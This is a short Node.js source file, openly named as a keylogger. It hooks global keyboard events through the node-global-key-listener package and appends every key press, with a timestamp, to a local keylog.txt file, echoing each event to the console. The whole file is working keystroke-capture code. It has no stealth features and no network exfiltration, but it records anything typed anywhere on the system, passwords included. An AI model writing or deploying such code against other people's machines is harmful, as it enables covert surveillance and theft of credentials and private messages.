// keylogger.js
const path = require("path");
const { GlobalKeyboardListener } = require("node-global-key-listener");
const fs = require("fs");
const logFile = path.join(__dirname, "keylog.txt");

const keyboard = new GlobalKeyboardListener();

keyboard.addListener(e => {
  console.log("Event:", e); // Debug: log every event to the console
  if (e.state === "DOWN") {
    const log = `Key pressed: ${e.name} at ${new Date().toISOString()}\n`;
    try {
      fs.appendFileSync(logFile, log);
      console.log("Logged to file:", log.trim());
    } catch (error) {
      console.error("Error writing to file:", error);
    }
  }
});

console.log("Keylogger started. Press Ctrl+C to stop.");